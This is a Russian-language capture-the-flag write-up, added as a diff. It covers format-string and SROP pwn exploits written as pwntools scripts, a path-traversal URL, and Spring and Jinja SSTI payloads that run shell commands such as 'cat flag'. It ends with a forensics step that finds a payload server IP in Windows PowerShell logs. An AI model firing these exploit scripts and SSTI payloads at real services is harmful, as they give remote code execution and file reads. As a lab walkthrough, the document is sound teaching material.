@@ -1,0 +1,65 @@
+
+Часть 1:
+pwn1:
+	1.Открываем файл в ida и замечаем уязвимость форматной строки.Ликнуть ничего не получается,поэтому надо что-то перезаписать.
+	2.Гуглим в интернете перезапись с помощью форматной строки и находим интересную статью с очень похожей задачей:https://habr.com/ru/articles/460647/
+	3.В статье перезаписывают exit на main. Мы будем на win(адрес exit легко узнать с помощью gdb).
+	4.Получается вот такой эксплоит:
+			from pwn import *
+			p = remote('192.168.12.13',1923)
+			exit_addr=0x404018
+			win_adr=0x401156
+			payload = (b"%86p%14$n%16315p%15$n").ljust(64,b'*')
+			payload += p64(exit_addr)
+			payload += p64(exit_addr+1)
+			p.sendline(payload)
+			p.interactive()
+	5.флаг-nto{easy_formt_string}
+		
+pwn2:
+	1.Открываем файл в ida и видим строчки на ассемблере.После пару минут размышлений и поиска в интернете находим очень похожую уязвимость, которая называется SROP.
+	2.Гуглим что такое SROP и находим статью с в точь точь кодом как у нас.Вот она:https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop
+	3.Полностью переписываем оттуда эксплоит,кроме адреса строчки bin/sh.Узнать наш адрес мы можем с помощью hd(см image1)
+	4.Получаем вот такой эксплоит:
+			from pwn import *
+			elf = context.binary = ELF('./task', checksec=False)
+			p = remote('192.168.12.13',1555)
+			POP_RAX = 0x41018
+			SYSCALL_RET = 0x41015
+			print(hex(elf.address))
+			frame = SigreturnFrame()
+			frame.rax = 0x3b
+			frame.rip = SYSCALL_RET
+			BINSH = elf.address + 0x1430
+			frame.rdi = BINSH 
+			payload = b'A' * 8
+			payload += p64(POP_RAX)
+			payload += p64(0xf)
+			payload += p64(SYSCALL_RET)
+			payload += bytes(frame)
+			p.sendline(payload)			
+			p.interactive()
+	5.флаг nto{sropsropsroplazy}
+
+web1:
+	1. При просмотре кода страницы замечаем, что число 20 является ссылкой.При нажатии мы переходим на страницу: http://192.168.12.10:5001/download?file_type=file1.txt
+	2. При маленьком переборе получаем флаг через url:http://192.168.12.10:5001/download?file_type=/../flag.txt
+	3. флаг-nto{P6t9_T77v6RsA1}
+web2:
+	1. При открытии jar файла с помощью jadx-gui видим,что приложение написано на spring.
+	2. При поиске уязвимостей со spring находим уязвимость Spring View Manipulation
+	3. При чтении статей видим похожии ситуации с /doc/ и понимаем, что там возможна SSTI.
+	4. При подстановке такой SSTI получаем флаг - http://192.168.12.13:8090/doc/__$%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22cat%20flag%22).getInputStream()).next()%7D__::.x__$%7BT(java.lang.Runtime).getRuntime().exec(%22touch%20executed%22)%7D__::.x
+	5. флаг - nto{abobovichasdfas}
+web3:
+	1.Так как при любом вводе нас перенаправляет на флаг, то писать что-то на основной странице бессмысленно.
+	2.Если просто писать url/flag ,б то будет Forbidden, но если поставить // , то все будет работать и будет выводится приветствие с GET параметром name.(Почему так мы не знаем мы случайно поставили // вместо /)
+	3.Путем перебора разных уязвимостей находим SSTI.
+	4.При подставлении такой SSTI получаем флаг - http://192.168.12.11:8001//flag?name={{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20flag.txt%27).read()}}
+	5. флаг -  nto{Ht1P_sM088Lin6_88Ti}  
+
+
+Часть 2:
+	1.Ответ на этот вопрос находился во второй части легенды.(электронная почта)
+	2.Мы открыли просмотр событий Windows,потом журналы приложений и служб,потом в windows powershell и там нашли ip с которого бралась полезная нагрузка - http://95.169.192.220:8080
+	
